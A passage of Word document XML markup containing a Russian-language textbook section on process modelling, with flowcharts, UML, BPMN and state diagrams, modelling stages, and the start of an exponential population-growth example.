    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Модель распространения слухов в социальных сетях.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.2.4. Моделирование процессов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Процесс (process)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это последовательность действий, преобразующих входные данные в выходные.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры процессов:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Оформление заказа в интернет-магазине</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Процесс получения загранпаспорта (подача документов → оплата → ожидание → получение)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Алгоритм сортировки массива</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Жизненный цикл разработки ПО (требования → проектирование → реализация → тестирование → деплой)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Для моделирования процессов используют различные виды диаграмм.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1. Блок-схемы (Flowcharts)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Блок-схема (flowchart)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — графическое представление алгоритма или процесса с помощью блоков и стрелок.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Основные элементы блок-схемы:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Символ                  | Название             | Описание                          |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| ----------------------- | -------------------- | --------------------------------- |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Овал                    | Начало/конец         | Старт или завершение процесса     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Прямоугольник           | Действие (процесс)   | Выполнение операции               |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Ромб                    | Условие (решение)    | Проверка условия (да/нет)         |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Параллелограмм          | Ввод/вывод           | Ввод данных или вывод результата  |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Стрелки                 | Связи                | Направление потока выполнения     |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 1: Блок-схема процесса "Сделать чай"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[Начало]</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ↓</w:t>
        <w:br/>
        <w:t>[Взять чайник]</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ↓</w:t>
        <w:br/>
        <w:t>[Есть ли вода в чайнике?] ← (ромб)</w:t>
        <w:br/>
        <w:t xml:space="preserve">   Нет → [Налить воды] → (переход к "Включить чайник")</w:t>
        <w:br/>
        <w:t xml:space="preserve">   Да ↓</w:t>
        <w:br/>
        <w:t>[Включить чайник]</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ↓</w:t>
        <w:br/>
        <w:t>[Вода закипела?] ← (ромб)</w:t>
        <w:br/>
        <w:t xml:space="preserve">   Нет → (ждём) → (переход обратно к "Вода закипела?")</w:t>
        <w:br/>
        <w:t xml:space="preserve">   Да ↓</w:t>
        <w:br/>
        <w:t>[Залить кипяток в чашку]</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ↓</w:t>
        <w:br/>
        <w:t>[Положить чайный пакетик]</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ↓</w:t>
        <w:br/>
        <w:t>[Подождать 3 минуты]</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ↓</w:t>
        <w:br/>
        <w:t>[Конец]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Применение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Алгоритмы, бизнес-процессы, инструкции.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Простота, понятность.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Для сложных систем блок-схема становится огромной и нечитаемой.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2. UML-диаграммы (Unified Modeling Language)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>UML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — стандартный язык моделирования для визуализации, проектирования и документирования программных систем.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>UML содержит множество типов диаграмм. Для моделирования процессов наиболее важны:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Use Case Diagram (Диаграмма вариантов использования)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Показывает </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>кто</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (актёры) и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>что</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (функции) делает в системе.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 2: Use Case диаграмма для банкомата</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Актёры:</w:t>
        <w:br/>
        <w:t>- Клиент (человек с картой)</w:t>
        <w:br/>
        <w:t>- Банковская система (backend)</w:t>
        <w:br/>
        <w:br/>
        <w:t>Варианты использования (функции):</w:t>
        <w:br/>
        <w:t>- Проверить баланс</w:t>
        <w:br/>
        <w:t>- Снять наличные</w:t>
        <w:br/>
        <w:t>- Пополнить счёт</w:t>
        <w:br/>
        <w:t>- Перевести деньги</w:t>
        <w:br/>
        <w:br/>
        <w:t>Связи:</w:t>
        <w:br/>
        <w:t>- Клиент → Проверить баланс</w:t>
        <w:br/>
        <w:t>- Клиент → Снять наличные</w:t>
        <w:br/>
        <w:t>- Клиент → Пополнить счёт</w:t>
        <w:br/>
        <w:t>- Банковская система → Авторизовать клиента (проверка PIN-кода)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Применение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Сбор требований, документирование функциональности системы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Activity Diagram (Диаграмма активности)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Показывает </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>последовательность действий</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (аналог блок-схемы, но более мощная).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 3: Activity диаграмма "Оформление заказа в интернет-магазине"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[Начало]</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ↓</w:t>
        <w:br/>
        <w:t>[Пользователь добавляет товары в корзину]</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ↓</w:t>
        <w:br/>
        <w:t>[Нажимает "Оформить заказ"]</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ↓</w:t>
        <w:br/>
        <w:t>&lt;Авторизован?&gt; ← (ромб)</w:t>
        <w:br/>
        <w:t xml:space="preserve">   Нет → [Регистрация/Вход] → (переход к "Ввод адреса доставки")</w:t>
        <w:br/>
        <w:t xml:space="preserve">   Да ↓</w:t>
        <w:br/>
        <w:t>[Ввод адреса доставки]</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ↓</w:t>
        <w:br/>
        <w:t>[Выбор способа оплаты]</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ↓</w:t>
        <w:br/>
        <w:t>&lt;Оплата картой?&gt; ← (ромб)</w:t>
        <w:br/>
        <w:t xml:space="preserve">   Да → [Ввод данных карты] → [Оплата]</w:t>
        <w:br/>
        <w:t xml:space="preserve">   Нет → [Наличными при получении]</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ↓</w:t>
        <w:br/>
        <w:t>[Подтверждение заказа]</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ↓</w:t>
        <w:br/>
        <w:t>[Отправка email с подтверждением]</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ↓</w:t>
        <w:br/>
        <w:t>[Конец]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Применение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Моделирование бизнес-процессов, workflow.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3. BPMN (Business Process Model and Notation)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>BPMN</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — стандарт для моделирования бизнес-процессов. Похож на блок-схемы, но с бóльшим количеством элементов и нотаций.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Основные элементы BPMN:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**События (Events):** начало, промежуточное событие, конец (кружочки)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Задачи (Tasks):** действие, которое нужно выполнить (прямоугольники с закруглёнными углами)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Шлюзы (Gateways):** условия, развилки (ромбы)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Потоки (Sequence Flow):** стрелки, показывающие порядок выполнения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 4: BPMN-диаграмма "Процесс обработки жалобы клиента"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[Начало: Поступила жалоба]</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ↓</w:t>
        <w:br/>
        <w:t>[Задача: Регистрация жалобы в системе]</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ↓</w:t>
        <w:br/>
        <w:t>&lt;Шлюз: Жалоба обоснована?&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">   Да → [Задача: Назначить ответственного сотрудника]</w:t>
        <w:br/>
        <w:t xml:space="preserve">      ↓</w:t>
        <w:br/>
        <w:t xml:space="preserve">      [Задача: Решить проблему]</w:t>
        <w:br/>
        <w:t xml:space="preserve">      ↓</w:t>
        <w:br/>
        <w:t xml:space="preserve">      [Задача: Уведомить клиента]</w:t>
        <w:br/>
        <w:t xml:space="preserve">      ↓</w:t>
        <w:br/>
        <w:t xml:space="preserve">      [Конец: Жалоба закрыта]</w:t>
        <w:br/>
        <w:t xml:space="preserve">   Нет → [Задача: Отправить отказ клиенту]</w:t>
        <w:br/>
        <w:t xml:space="preserve">      ↓</w:t>
        <w:br/>
        <w:t xml:space="preserve">      [Конец: Жалоба отклонена]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Применение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Моделирование бизнес-процессов в крупных организациях, BPM-системы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Стандартизован, поддерживается множеством инструментов (Bizagi, Camunda).  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Слишком подробный для простых задач.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4. State Diagram (Диаграмма состояний)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Диаграмма состояний</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> показывает, в каких состояниях может находиться объект и как он переходит из одного состояния в другое.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 5: Диаграмма состояний "Заказ в интернет-магазине"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[Состояние: Создан] ← (начальное состояние)</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ↓ (Событие: Оплачен)</w:t>
        <w:br/>
        <w:t>[Состояние: Оплачен]</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ↓ (Событие: Отправлен)</w:t>
        <w:br/>
        <w:t>[Состояние: В доставке]</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ↓ (Событие: Доставлен)</w:t>
        <w:br/>
        <w:t>[Состояние: Доставлен]</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ↓ (Событие: Получен клиентом)</w:t>
        <w:br/>
        <w:t>[Состояние: Завершён]</w:t>
        <w:br/>
        <w:br/>
        <w:t>Альтернативные переходы:</w:t>
        <w:br/>
        <w:t>- Создан → (Событие: Отменён) → [Состояние: Отменён]</w:t>
        <w:br/>
        <w:t>- Оплачен → (Событие: Возврат средств) → [Состояние: Возвращён]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Применение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Моделирование систем с чётко выраженными состояниями (заказы, документы, процессы).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.2.5. Этапы моделирования</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Моделирование — это не "нарисовал схемку и пошёл дальше". Это итеративный процесс, состоящий из нескольких этапов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Этап 1: Постановка задачи</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что делаем:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Формулируем, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>что именно</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> мы моделируем и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>зачем</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вопросы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Какую систему или процесс моделируем?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Какова цель моделирования? (понять, оптимизировать, задокументировать)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Какие аспекты важны, а какие можно игнорировать?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> "Моделируем процесс оформления заказа в интернет-магазине, чтобы понять узкие места и ускорить процесс."</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Этап 2: Разработка модели</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что делаем:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Выбираем тип модели (блок-схема, UML, таблица, формула) и создаём её.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вопросы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Какой тип модели подходит? (графическая, табличная, математическая)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Какие данные нужны для построения модели?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Какие инструменты использовать? (бумага, draw.io, Enterprise Architect, Excel)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Рисуем Activity Diagram в draw.io, показывая шаги: добавление в корзину → авторизация → выбор доставки → оплата → подтверждение.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Этап 3: Проверка модели на адекватность</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что делаем:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Проверяем, соответствует ли модель реальности.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вопросы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Описывает ли модель все важные аспекты?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нет ли ошибок или противоречий?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Соответствует ли модель реальному поведению системы?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Способы проверки:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Обсуждение с экспертами** (показываем модель заказчику, бизнес-аналитику, разработчикам)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Тестирование на данных** (если модель математическая — прогоняем через неё реальные данные)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Симуляция** (запускаем процесс по модели и смотрим, что получится)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Показываем Activity Diagram менеджеру магазина: "Всё правильно? Учтены все случаи?"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Этап 4: Анализ результатов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что делаем:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Используем модель для получения выводов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вопросы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Какие узкие места видны в модели?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Можно ли оптимизировать процесс?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Что будет, если изменить параметры?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> На диаграмме видно, что процесс авторизации занимает слишком много времени (пользователь забывает пароль, запрашивает сброс, ждёт письмо). Решение: добавить вход через Google/Facebook.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Этап 5: Корректировка модели</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что делаем:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Если модель неадекватна или требования изменились — исправляем модель.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Заказчик говорит: "А мы ещё хотим возможность оплаты криптовалютой." Добавляем в диаграмму новую ветку: "Оплата → Выбор способа → Криптовалюта → Генерация адреса кошелька → Ожидание подтверждения транзакции."</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.2.6. Примеры моделирования</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 6: Модель роста населения (математическая модель)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Спрогнозировать численность населения города через 10 лет.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Дано:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Текущая численность населения: `P₀ = 100 000` человек</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Коэффициент роста: `r = 0.02` (2% в год, рождаемость выше смертности)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Время: `t = 10` лет</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Модель:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Экспоненциальный рост (упрощённая, без учёта миграции, войн, эпидемий)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>P(t) = P₀ × e^(r×t)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
